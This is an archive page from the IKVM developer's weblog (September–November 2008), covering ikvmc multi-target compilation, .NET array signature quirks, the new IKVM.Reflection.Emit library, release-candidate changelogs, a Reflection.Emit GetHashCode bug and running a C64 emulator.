<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.529in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.security.securitytreatassafeattribute.aspx">SecurityTreatAsSafeAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 3.594in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Understood by the runtime, but stored normally.</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.529in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.typelibversionattribute.aspx">TypeLibVersionAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 3.594in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Understood by the compiler, but stored normally.</P></TD></TR></TBODY></TABLE></DIV>
<P>&nbsp;</P>
<P>Clarifications, corrections and additions to both lists are very much appreciated.</P>
<P><STRONG>Update</STRONG>: Removed incorrect claim that the runtime only supports the DebuggableAttribute (bool,bool) constructor. Thanks to Kevin M. Owen for the correction.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/25/2008 07:04:36 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=45d72b78-1aba-48f4-91c3-b0c98accd99a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=45d72b78-1aba-48f4-91c3-b0c98accd99a">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 19 November 2008</h2></div>
<div class="newsItems"><a name="a46dbafeb-4d5a-42ff-a34b-414b8b2361c0"></a><div class="entry">
	<h3 class="entryTitle">Multi Target Support</h3>
	<div class="entryBody">
		<P>I've now enabled "multi target" support. This means that you can compile multiple assemblies at once. One of the advantages this has is that it makes dealing with circular dependencies much easier, but even if there aren't any circular dependencies, it can make building much easier because you don't have to do any dependency analysis.</P>
<P>As an example I compiled the jars from the JBoss lib directory:</P>
<P><CODE>ikvmc -target:library { commons-codec.jar } { commons-httpclient.jar } { commons-logging.jar } { concurrent.jar } { getopt.jar } { jboss-common.jar } { jboss-jmx.jar } { jboss-system.jar } { jboss-xml-binding.jar } { log4j-boot.jar }</CODE></P>
<P>The curly braces define the targets. This is all it takes to compile these jars into seperate assemblies that automatically reference eachother, as required.</P>
<P>Using <A href="http://www.ndepend.com/">NDepend</A> (which Patrick Smacchia kindly gave me a free copy of) you can easily graph the dependencies of the resulting assemblies:</P>
<P><A href="http://www.frijters.net/jboss-lib-dependencies-full.png"><IMG border=0 src="http://www.frijters.net/jboss-lib-dependencies-small.png"></A></P>
<P>In this case there aren't any cycles, but had there been, it would have made no differences.</P>
<P>The multi target feature is by no means done. I want to add a -sharedclassloader option to enable multiple assemblies to share a single Java class loader. I'm also considering some options to select which classes/packages go in which assembly. This would be helpful for splitting the core class library into multiple assemblies.</P>
<P>Changes:</P>
<UL>
<LI>Added support to ikvmstub for automatically exporting non-vector array types. 
<LI>Implemented/fixed support for pointers, by ref and non-vector arrays in IKVM.Reflection.Emit. 
<LI>Fixed pointer detection to work for types with multiple indirection levels. 
<LI>Changed proxy stub name mangling to work around ildasm bug. 
<LI>Fixed IKVM.Reflection.Emit to not write token of FAULT pseudo exception that is used as a marker for fault blocks. 
<LI>Fixed class loading to take ClassLoader lock. 
<LI>Changed ikvmc not to generate warning when it loads ikvmstub generated classes. 
<LI>Removed our version of System.Runtime.CompilerServices.ExtensionAttribute and instead add System.Core.jar to the compilation, this will allow us to reference the real ExtensionAttribute when it is available and yet the build will still work (albeit with a warning and without the ExtensionAttribute) when it is not available (i.e. when building on .NET 2.0). 
<LI>Did some clean up and restructuring in IKVM.Reflection.Emit. 
<LI>Fixed sorting of InterfaceImpl table in IKVM.Reflection.Emit. 
<LI>Removed hard coded public keys from JniInterface.cs and Configuration.java. 
<LI>Changed build process so that version number for all assemblies only has to be specified in CommonAssemblyInfo.cs. 
<LI>Enabled multi target support. 
<LI>Fixed typo in IKVM.Reflection.Emit that caused assembly minor version to be set to major version. 
<LI>Added assembly version to ikvmstub.</LI></UL>
<P>As always with a development snapshot, don't use this in production, but please do try it out and let me know about it. The sources are available in <A href="http://ikvm.cvs.sourceforge.net/viewvc/ikvm/ikvm/">cvs</A> and the binaries here: <A href="http://www.frijters.net/ikvmbin-0.39.3245.zip">ikvmbin-0.39.3245.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/19/2008 07:46:06 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=46dbafeb-4d5a-42ff-a34b-414b8b2361c0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=46dbafeb-4d5a-42ff-a34b-414b8b2361c0">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 17 November 2008</h2></div>
<div class="newsItems"><a name="ac2d66b12-4feb-4205-80d7-724fcde5d8f8"></a><div class="entry">
	<h3 class="entryTitle">.NET Array Weirdness</h3>
	<div class="entryBody">
		<P>One of the lesser known features of the .NET runtime is the support for multidimensional and/or non-zero-based arrays. The typical arrays that you use (and that are the same as the arrays in Java) are called vectors in the CLI specification, but unfortunately the non-vector arrays don't have a specific name (they are simply called arrays in the CLI specification).</P>
<P>In C# you can easily create a non-vector array:</P>
<P><CODE><FONT color=#0000ff>int</FONT>[,] arr1 = <FONT color=#0000ff>new int</FONT>[4, 4]</CODE></P>
<P>This creates a two dimensional array of integers with 16 elements. This array is zero based. If you want to create a non-zero-based array, you have to use the API, because C# doesn't directly support that:</P>
<P><CODE><FONT color=#0000ff>int</FONT>[,] arr2 = (<FONT color=#0000ff>int</FONT>[,])<FONT color=#2b91af>Array</FONT>.CreateInstance(<FONT color=#0000ff>typeof</FONT>(<FONT color=#0000ff>int</FONT>), <FONT color=#0000ff>new</FONT>[] { 4, 4 }, <FONT color=#0000ff>new</FONT>[] { 1, 1 });</CODE></P>
<P>This also creates a two dimensional array of integers with 16 elements, but in this case the indexes run from 1 through 5.</P>
<P>So far, so good. Now let's look at how things look at the IL level. If you use ildasm to look at the first C# based instantation you'll see:</P>
<P><CODE>ldc.i4.1<BR>ldc.i4.1<BR>newobj instance void int32[0...,0...]::.ctor(int32, int32)</CODE></P>
<P>Most of this looks straightforward if you're familiar with IL, except for the <CODE>[0...,0...]</CODE> part. It looks like the lower bounds are part of the type, but a simple experiment shows that this is not the case:</P>
<P><CODE><FONT color=#2b91af>Console</FONT>.WriteLine(arr1.GetType() == arr2.GetType());</CODE></P>
<P>This prints out <CODE>True</CODE>. This implies that the lower bounds are not part of the type (and the CLI specification confirms this). So why are they part of the signature? I don't know for sure, but it does have an interesting consequence. You can overload methods based on this:</P>
<P><CODE>.assembly extern mscorlib { }<BR>.assembly Test { }<BR>.module Test.exe<BR><BR>.class public Program<BR>{<BR>&nbsp; .method public static void Foo(int32[0...,0...] foo)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; ret<BR>&nbsp; }<BR><BR>&nbsp; .method public static void Foo(int32[1...,1...] foo)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; ret<BR>&nbsp; }<BR><BR>&nbsp; .method private static void Main()<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; .entrypoint<BR>&nbsp;&nbsp;&nbsp; ldc.i4.1<BR>&nbsp;&nbsp;&nbsp; ldc.i4.1<BR>&nbsp;&nbsp;&nbsp; newobj instance void int32[0...,0...]::.ctor(int32, int32)<BR>&nbsp;&nbsp;&nbsp; call void Program::Foo(int32[0...,0...])<BR>&nbsp;&nbsp;&nbsp; ret<BR>&nbsp; }<BR>}</CODE></P>
<P>This is a valid and verifiable application. Unfortunately, using the&nbsp; .NET reflection API it is impossible to see the difference in signatures between the two Foo methods.</P>
<P>This limitation in reflection means that code compiled with the new IKVM.Reflection.Emit based ikvmc won't be able to call methods that have non-zero-based array parameters. It is also impossible to override these methods, but that was already the case with the previous System.Reflection.Emit based implementation as well.</P>
<P>Finally, in the above text I talk about the lower bounds, but the same thing applies to the upper bounds of the array.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/17/2008 07:08:46 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c2d66b12-4feb-4205-80d7-724fcde5d8f8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c2d66b12-4feb-4205-80d7-724fcde5d8f8">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 14 November 2008</h2></div>
<div class="newsItems"><a name="a9b7ada92-88d7-45c7-be83-8e6f4f3ccb1b"></a><div class="entry">
	<h3 class="entryTitle">Introducing IKVM.Reflection.Emit</h3>
	<div class="entryBody">
		<P>Over the past two months I've been working on reimplementing a large portion of the Reflection.Emit API from scratch. After finally <A HREF="/PermaLink.aspx?guid=afe525f9-1715-4db2-9d71-34892292cb87">growing tired</A> of the System.Reflection.Emit bugs and limitations and not finding <A HREF="/PermaLink.aspx?guid=c8ee66de-d82a-4383-a285-bef105972b9f">Mono.Cecil</A> satisfactory either, I decided to build my own implementation.</P>
<P>I started out with these design goals:</P>
<UL>
<LI>API compatible with System.Reflection.Emit (as much as possible).</LI>
<LI>Implement only the Emit part and be compatible with System.Reflection.</LI>
<LI>Only implement functionality required by ikvmc, but not implemented functionality shouldn't silently fail (i.e. it should throw a NotSupportedException or NotImplementedException). This also means that the API is mostly write-only.</LI>
<LI>Efficient implementation, optimized for ikvmc specific scenarios.</LI></UL>
<P>I think I've met or exceeded all of the design goals. Without doing any significant performance work on my Ref.Emit implementation (other than the design), ikvmc became so much faster that it is rather emberassing for the Microsoft System.Reflection.Emit implementation.</P>
<P>I've only had to make a couple of minor changes to the ikvmc sources (apart from changing <CODE>using System.Reflection.Emit;</CODE> to <CODE>using IKVM.Reflection.Emit;</CODE> in every file) to account for the fact that IKVM.Reflection.Emit.ModuleBuilder and IKVM.Reflection.Emit.AssemblyBuilder unfortunately cannot extend System.Reflection.Module and System.Reflection.Assembly. However, it looks like this is fixed in the .NET 4.0 CTP.</P>
<P>Here are some random statistics about compiling IKVM.OpenJDK.ClassLibrary.dll on .NET 2.0 SP2 x64:</P>
<TABLE border=0 cellSpacing=0>
<TBODY>
<TR>
<TD style="BORDER-BOTTOM: black 1px solid; BORDER-RIGHT: black 1px solid">&nbsp;</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>System.Reflection.Emit</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>&nbsp;&nbsp;&nbsp; IKVM.Reflection.Emit</TD>
<TD style="BORDER-BOTTOM: black 1px solid">&nbsp;</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">File size</TD>
<TD align=right>31,645,696</TD>
<TD align=right>30,480,896</TD>
<TD>&nbsp; bytes</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">CPU time used</TD>
<TD align=right>272</TD>
<TD align=right>35</TD>
<TD>&nbsp; seconds</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">Peak virtual memory</TD>
<TD align=right>1,433,399,296</TD>
<TD align=right>1,035,018,240</TD>
<TD>&nbsp; bytes</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">Generation 0 GCs</TD>
<TD align=right>770</TD>
<TD align=right>896</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">Generation 1 GCs</TD>
<TD align=right>201</TD>
<TD align=right>240</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">Generation 2 GCs</TD>
<TD align=right>11</TD>
<TD align=right>8</TD>
<TD>&nbsp;</TD></TR></TBODY></TABLE>
<P>(The huge memory usage is not because it actually needs that much memory, but simply the result of the fact that garbage collection is more efficient if you have more memory available and that my system had about 1.5GB of free memory while running these tests.)</P>
<P>The smaller file size is because System.Reflection.Emit always uses fat method headers and IKVM.Reflection.Emit uses tiny method headers whenever possible.</P>
<P>There is still some work left to do, I've only spent limited time on debugging support and there is no support for Mono's .mdb format yet. I also haven't done any testing on Mono yet. </P>
<P>BTW, thanks to Sebastien Pouliot for <A href="http://anonsvn.mono-project.com/viewvc/trunk/mcs/class/corlib/Mono.Security.Cryptography/CryptoConvert.cs?view=markup">code I lifted from Mono</A> to parse strong name CAPI key blobs.</P>
<P>Other changes in this snapshot:</P>
<UL>
<LI>Dropped support for Visual Studio 2005.</LI>
<LI>Added error message when map.xml references non-existing constructor.</LI>
<LI>Added more statistics to ikvmc -time option output.</LI></UL>
<P>As always with a development snapshot, don't use this in production, but please do try it out and let me know about it. The sources are available in <A href="http://ikvm.cvs.sourceforge.net/viewvc/ikvm/ikvm/">cvs</A> and the binaries here: <A href="http://www.frijters.net/ikvmbin-0.39.3240.zip">ikvmbin-0.39.3240.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/14/2008 10:01:50 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9b7ada92-88d7-45c7-be83-8e6f4f3ccb1b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9b7ada92-88d7-45c7-be83-8e6f4f3ccb1b">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 12 November 2008</h2></div>
<div class="newsItems"><a name="a288e2d5f-6568-49bf-a1b7-2a57537dcd2d"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.38 Release Candidate 2</h3>
	<div class="entryBody">
		<P>A codegen bug was found (not a regression, so there will be a 0.36 update as well) so here's another release candidate.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 0.38.0.2.</LI>
<LI>Fixed openjdk.build BOM issue on Linux.</LI>
<LI>Fixed jsr verifier bug that caused incorrect codegen under very specific circumstances (thanks to Brian Schwallier for tracking down a repro).</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.38.0.2.zip">ikvmbin-0.38.0.2.zip</A><BR>Sources (+ binaries): Sources: <A href="http://www.frijters.net/ikvm-0.38.0.2.zip">ikvm-0.38.0.2.zip</A>, <A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>, <A href="http://www.frijters.net/openjdk6-b12-stripped.zip">openjdk6-b12-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/12/2008 06:13:29 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=288e2d5f-6568-49bf-a1b7-2a57537dcd2d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=288e2d5f-6568-49bf-a1b7-2a57537dcd2d">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 05 November 2008</h2></div>
<div class="newsItems"><a name="a6f478a9f-bf97-4179-bc8f-029be6f8a1bb"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 Update 2 Release Candidate 2</h3>
	<div class="entryBody">
		<P>As announced when 0.36 was released, I will periodically release updates to 0.36 as long as there is enough interest in .NET 1.1 support.</P>
<P>This is the second release candidate of the second update.</P>
<P>Changes (all are back ported fixes):</P>
<UL>
<LI>Changed version to 0.36.0.13.</LI>
<LI>Fixed ikvmc not to open the key file for write access.</LI>
<LI>Added more efficient float/double to/from int/long bits converters.</LI>
<LI>Fixed libikvm-native.so build to include reference to gmodule-2.0 library.</LI>
<LI>Fixed ikvmc not to open the key file for write access.</LI>
<LI>Fixed Graphics2D.rotate() to convert rotation angle from radians (Java) to degrees (.NET).</LI>
<LI>Applied awt patch <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=1979656&amp;group_id=69637&amp;atid=525266">#1979656</A> by Daniel Wilson.</LI>
<LI>Fixed three String bugs found by OpenJDK string tests.</LI>
<LI>Fixed ldc &lt;class&gt; where &lt;class&gt; is a ghost array.</LI>
<LI>Fixed bug in instanceof &lt;class&gt; where &lt;class&gt; is a Serializable[].</LI>
<LI>Removed incorrect DataFormatException thrown in java.util.zip.InflaterHuffmanTree.</LI>
<LI>Fixed <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=2001802&amp;group_id=69637&amp;atid=525264">#2001802</A> contributed by Andy Malakov.</LI>
<LI>Fixed <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=2001799&amp;group_id=69637&amp;atid=525264">#2001799</A>.</LI>
<LI>Fixed <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=2006953&amp;group_id=69637&amp;atid=525264">#2006953</A>.</LI>
<LI>Made finalize() and clone() methods in cli.System.Object and cli.System.Exception final.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.36.0.13.zip">ikvmbin-0.36.0.13.zip</A><BR>Sources (+ binaries): <A href="http://www.frijters.net/ikvm-0.36.0.13.zip">ikvm-0.36.0.13.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/05/2008 10:08:46 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=6f478a9f-bf97-4179-bc8f-029be6f8a1bb"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=6f478a9f-bf97-4179-bc8f-029be6f8a1bb">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 04 November 2008</h2></div>
<div class="newsItems"><a name="ad9195c6b-2dad-4e77-9d5f-f1b5edf2e5fb"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.38 Release Candidate 1</h3>
	<div class="entryBody">
		<P>A couple of minor fixes.</P>
<P>Changes since RC0:</P>
<UL>
<LI>Updated version to 0.38.0.1</LI>
<LI>Hide nested types generated by callerID support</LI>
<LI>Made finalize() and clone() methods in cli.System.Object and cli.System.Exception final</LI>
<LI>Fixed reflection to work on .NET 2.0 RTM</LI></UL>
<P>Note that even though I fixed reflection to work on .NET 2.0 RTM, it still isn't a supported platform, I strongly recommend .NET 2.0 SP1 or higher.</P>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.38.0.1.zip">ikvmbin-0.38.0.1.zip</A><BR><BR>Sources: <A href="http://www.frijters.net/ikvm-0.38.0.1.zip">ikvm-0.38.0.1.zip</A>, <A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>, <A href="http://www.frijters.net/openjdk6-b12-stripped.zip">openjdk6-b12-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/04/2008 06:36:51 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d9195c6b-2dad-4e77-9d5f-f1b5edf2e5fb"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d9195c6b-2dad-4e77-9d5f-f1b5edf2e5fb">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 26 September 2008</h2></div>
<div class="newsItems"><a name="a57d8a17d-ed6f-48f8-a74a-9e37d14ccf3f"></a><div class="entry">
	<h3 class="entryTitle">More Reflection.Emit Brokenness</h3>
	<div class="entryBody">
		<P>Pardon me if I sound a little bitter today, but I just wasted almost a full day trying to work around <A href="/PermaLink.aspx?guid=afe525f9-1715-4db2-9d71-34892292cb87">this bug</A> only to be stopped by yet another bug that makes it impossible to generate two mutually dependent assemblies with Reflection.Emit.</P>
<P>Also, while debugging I noticed another mind bogglingly stupid bug in the System.Reflection.Assembly source:</P>
<P><CODE><FONT color=#0000ff>public override int</FONT> GetHashCode() { <FONT color=#0000ff>return base</FONT>.GetHashCode(); }</CODE></P>
<P>Why would you want to do that? Oh, of course! It's to get rid of a <A href="http://msdn.microsoft.com/en-us/library/xxhbfytk(VS.80).aspx">compiler warning</A>... If you override Equals() you should also override GetHashCode(), BUT NOT LIKE THIS.</P>
<P>Here's small program that demonstrates the problem:</P>
<P><CODE><FONT color=#0000ff>using</FONT> System;<BR><FONT color=#0000ff>using</FONT> System.Reflection;<BR><FONT color=#0000ff>using</FONT> System.Reflection.Emit;<BR><BR><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>Program</FONT><BR>{<BR>&nbsp; <FONT color=#0000ff>static void</FONT> Main()<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>AssemblyBuilder</FONT> ab1 = <FONT color=#2b91af>AppDomain</FONT>.CurrentDomain.DefineDynamicAssembly(<FONT color=#0000ff>new</FONT> <FONT color=#2b91af>AssemblyName</FONT>(<FONT color=#a31515>"A"</FONT>),<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>AssemblyBuilderAccess</FONT>.Run);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>ModuleBuilder</FONT> mod1 = ab1.DefineDynamicModule(<FONT color=#a31515>"A.dll"</FONT>);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>TypeBuilder</FONT> tb1 = mod1.DefineType(<FONT color=#a31515>"T"</FONT>);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Type</FONT> type = tb1.CreateType();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Console</FONT>.WriteLine(ab1.Equals(type.Assembly));<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Console</FONT>.WriteLine(ab1.GetHashCode() == type.Assembly.GetHashCode());<BR>&nbsp; }<BR>}</CODE></P>
<P>This prints out:</P>
<P>True<BR>False</P>
<P>That clearly violates the <A href="http://msdn.microsoft.com/en-us/library/system.object.gethashcode.aspx">Object.GetHashCode()</A> contract.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/26/2008 08:47:51 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=57d8a17d-ed6f-48f8-a74a-9e37d14ccf3f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=57d8a17d-ed6f-48f8-a74a-9e37d14ccf3f">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 24 September 2008</h2></div>
<div class="newsItems"><a name="a46cc8247-d64d-4162-98c5-71e342dcdfb2"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.38 Release Candidate 0</h3>
	<div class="entryBody">
		<P>As with previous release candidates, this release includes strong named binaries and is considered to be (nearly) ready for production use. Please test this version and give feedback as soon as possible.</P>
<P>Changes since previous snapshot:</P>
<UL>
<LI>Changed version to 0.38.0.0 and strong named binaries.</LI>
<LI>Added missing HTMLEntities.res resource.</LI>
<LI>Re-introduced workaround for .NET JIT bug that causes .cctor not to run when a DynamicMethod invokes a method or gets/sets a field.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.38.0.0.zip">ikvmbin-0.38.0.0.zip</A><BR><BR>Sources: <A href="http://www.frijters.net/ikvm-0.38.0.0.zip">ikvm-0.38.0.0.zip</A>, <A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>, <A href="http://www.frijters.net/openjdk6-b12-stripped.zip">openjdk6-b12-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/24/2008 08:07:13 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=46cc8247-d64d-4162-98c5-71e342dcdfb2"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=46cc8247-d64d-4162-98c5-71e342dcdfb2">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 22 September 2008</h2></div>
<div class="newsItems"><a name="a4c0db4e2-3ce0-4d43-aaa8-46a190cac857"></a><div class="entry">
	<h3 class="entryTitle">Running JaC64</h3>
	<div class="entryBody">
		<P><A href="http://sourceforge.net/projects/jac64">JaC64</A> is a open source Commodore 64 emulator written in Java. I have many fond childhood memories&nbsp;of my C64, so I spent a little time fixing a couple of AWT issues and hacking together some sound support for ikvm. The sound patch is <A href="http://www.frijters.net/ikvm-jac64-sound.patch.txt">here</A>, but it won't go in because it is essentially hard coded for JaC64 and even then it doesn't really work, because it turns out that .NET has no decent sound API. The only API available is <A href="http://msdn.microsoft.com/en-us/library/system.media.soundplayer.aspx">SoundPlayer</A>, but it has an unacceptable latency (and can only play one sample at a time, so you can't hide the latency). JaC64 generates samples that are 0.25 seconds long and then plays these back to back. This means that you hear sound, but it is very choppy.</P>
<P>Two obligatory screen shots, first the emulator application and second just the C64 screen of my favorite game:</P>
<P><IMG border=0 src="http://www.frijters.net/jac64.png"></P>
<P><IMG border=0 src="http://www.frijters.net/krakout.png"></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/22/2008 07:19:53 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4c0db4e2-3ce0-4d43-aaa8-46a190cac857"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4c0db4e2-3ce0-4d43-aaa8-46a190cac857">Comments [1]</a>
		
		<br clear="all">
	</div>
</div><a name="afd1b08db-6211-4f5c-b9e8-2b66c604277a"></a><div class="entry">
